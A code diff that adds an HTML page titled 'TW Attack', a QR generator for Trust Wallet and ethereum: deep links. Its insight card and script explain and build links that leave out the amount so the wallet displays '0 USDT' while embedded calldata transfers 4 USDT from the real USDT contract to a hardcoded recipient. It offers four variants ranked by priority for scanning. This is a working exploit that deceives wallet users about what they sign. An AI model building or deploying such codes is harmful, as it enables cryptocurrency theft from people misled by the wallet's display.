@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TW Attack — trust:// raw data QR Generator</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; max-width: 700px; margin: 0 auto; }
+    h1 { font-size: 20px; margin-bottom: 4px; color: #f0883e; }
+    .subtitle { font-size: 12px; color: #8b949e; margin-bottom: 16px; }
+    .insight-card { background: #161b22; border: 1px solid #f0883e44; border-radius: 12px; padding: 14px; margin-bottom: 16px; }
+    .insight-card h3 { font-size: 13px; color: #f0883e; margin-bottom: 6px; }
+    .insight-card p { font-size: 12px; color: #c9d1d9; line-height: 1.5; }
+    .insight-card code { background: #0d1117; padding: 1px 5px; border-radius: 3px; font-size: 11px; color: #7ee787; }
+    .test-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    .test-card h3 { font-size: 14px; margin-bottom: 8px; }
+    .test-card .label { font-size: 11px; color: #8b949e; margin-bottom: 2px; }
+    .test-card .uri { font-size: 10px; color: #7ee787; word-break: break-all; background: #0d1117; padding: 8px; border-radius: 6px; margin: 8px 0; font-family: monospace; border: 1px solid #21262d; max-height: 60px; overflow-y: auto; }
+    .qr-box { text-align: center; margin: 12px 0; }
+    .qr-box img { max-width: 240px; max-height: 240px; border-radius: 8px; background: white; padding: 8px; margin: 0 auto; }
+    .qr-box .fallback { font-size: 11px; color: #8b949e; margin-top: 8px; }
+    .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 10px 0; }
+    .detail-grid div { background: #0d1117; padding: 8px; border-radius: 6px; }
+    .detail-grid .lbl { font-size: 9px; color: #8b949e; text-transform: uppercase; }
+    .detail-grid .val { font-size: 14px; font-weight: 600; margin-top: 2px; }
+    .detail-grid .val.shown { color: #f0883e; }
+    .detail-grid .val.exec { color: #ff6b6b; }
+    @media (max-width: 480px) {
+      .detail-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <h1>🔬 trust:// raw data — QR Generator</h1>
+  <p class="subtitle">No amount param → data passes through as calldata</p>
+
+  <div class="insight-card">
+    <h3>⚡ The Winning Format</h3>
+    <p>
+      <strong>Key insight:</strong> When <code>amount</code> is missing from <code>trust://send</code>, the wallet 
+      does NOT route to <code>erc20_transfer</code> (which ignores external data). Instead it falls to 
+      <code>contract_generic</code> which passes raw <code>data</code> through as transaction calldata.
+      <br><br>
+      <strong>Format:</strong><br>
+      <code>trust://send?asset=0xUSDT_CONTRACT&address=0xRECIPIENT&data=0xa9059cbb...</code>
+      <br><br>
+      <code>asset</code> = token contract → wallet shows "USDT"<br>
+      <code>address</code> = ignored or recipient (wallet sends data to asset)<br>
+      No <code>amount</code> → <strong style="color:#3fb950">data executes</strong>
+    </p>
+  </div>
+
+  <div class="test-card" id="testA">
+    <h3>🧪 A — trust://send?asset=USDT + data (no amount)</h3>
+    <div class="label">Shows: 0 USDT / 0 ETH • Executes: 4 USDT via raw data</div>
+    <div class="uri" id="uriA"></div>
+    <div class="qr-box" id="qrA"></div>
+    <div class="detail-grid">
+      <div><div class="lbl">Wallet Shows</div><div class="val shown">0 USDT</div></div>
+      <div><div class="lbl">Actually Executes</div><div class="val exec">4 USDT via raw data</div></div>
+    </div>
+  </div>
+
+  <div class="test-card" id="testB">
+    <h3>🧪 B — ethereum:0xUSDT@1?data (no value, no function)</h3>
+    <div class="label">Pure contract interaction — no ETH value</div>
+    <div class="uri" id="uriB"></div>
+    <div class="qr-box" id="qrB"></div>
+    <div class="detail-grid">
+      <div><div class="lbl">Wallet Shows</div><div class="val shown">0 ETH to USDT</div></div>
+      <div><div class="lbl">Actually Executes</div><div class="val exec">4 USDT transfer</div></div>
+    </div>
+  </div>
+
+  <div class="test-card" id="testC">
+    <h3>🧪 C — trust://send?asset=USDT + address=RCP + data (no amount)</h3>
+    <div class="label">Asset=contract, Address=recipient, data=transfer calldata</div>
+    <div class="uri" id="uriC"></div>
+    <div class="qr-box" id="qrC"></div>
+    <div class="detail-grid">
+      <div><div class="lbl">Wallet Shows</div><div class="val shown">0 USDT to RCP</div></div>
+      <div><div class="lbl">Actually Executes</div><div class="val exec">4 USDT via raw data</div></div>
+    </div>
+  </div>
+
+  <div class="test-card" id="testD">
+    <h3>🧪 D — trust://send?address=0xUSDT&value=0&data (no amount)</h3>
+    <div class="label">Address=USDT contract, value=0, data=transfer calldata</div>
+    <div class="uri" id="uriD"></div>
+    <div class="qr-box" id="qrD"></div>
+    <div class="detail-grid">
+      <div><div class="lbl">Wallet Shows</div><div class="val shown">0 ETH to USDT</div></div>
+      <div><div class="lbl">Actually Executes</div><div class="val exec">4 USDT via raw data</div></div>
+    </div>
+  </div>
+
+  <p class="subtitle" style="text-align:center;margin-top:16px;">
+    Scan with built-in camera (top-right button) • Priority: A → B → C → D
+  </p>
+
+  <script>
+    var USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+    var RCP = '0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a';
+    var DISPLAY = 1;    // 1 USDT shown
+    var EXECUTE = 4;    // 4 USDT actually transferred
+
+    function padHex(val, bytes) {
+      return val.toString(16).toLowerCase().padStart(bytes * 2, '0');
+    }
+
+    // ABI-encode: transfer(address,uint256)
+    // 0xa9059cbb + padded recipient + padded amount
+    function encodeTransfer(recipient, amount, decimals) {
+      var addr = recipient.replace('0x', '').toLowerCase();
+      var amt = BigInt(Math.round(amount * Math.pow(10, decimals)));
+      return '0xa9059cbb' + addr.padStart(64, '0') + padHex(amt, 32);
+    }
+
+    var calldata = encodeTransfer(RCP, EXECUTE, 6);
+    var displayWei = BigInt(Math.round(DISPLAY * Math.pow(10, 6))).toString();
+
+    var tests = [
+      {
+        id: 'A',
+        uri: 'trust://send?asset=' + USDT + '&address=' + RCP + '&data=' + calldata,
+        desc: 'trust:// send asset=USDT addr=RCP data=calldata (no amount)'
+      },
+      {
+        id: 'B',
+        uri: 'ethereum:' + USDT + '@1?data=' + calldata,
+        desc: 'ethereum:0xUSDT@1?data=calldata (no value, no function)'
+      },
+      {
+        id: 'C',
+        uri: 'trust://send?asset=' + USDT + '&data=' + calldata,
+        desc: 'trust:// send asset=USDT data=calldata (no address, no amount)'
+      },
+      {
+        id: 'D',
+        uri: 'trust://send?address=' + USDT + '&value=0&data=' + calldata,
+        desc: 'trust:// send address=USDT value=0 data=calldata'
+      }
+    ];
+
+    tests.forEach(function(t) {
+      document.getElementById('uri' + t.id).textContent = t.uri;
+      var container = document.getElementById('qr' + t.id);
+      var img = document.createElement('img');
+      img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=' + encodeURIComponent(t.uri);
+      img.alt = t.desc;
+      img.loading = 'lazy';
+      img.style.maxWidth = '240px';
+      img.style.maxHeight = '240px';
+      container.appendChild(img);
+    });
+  </script>
+</body>
+</html>
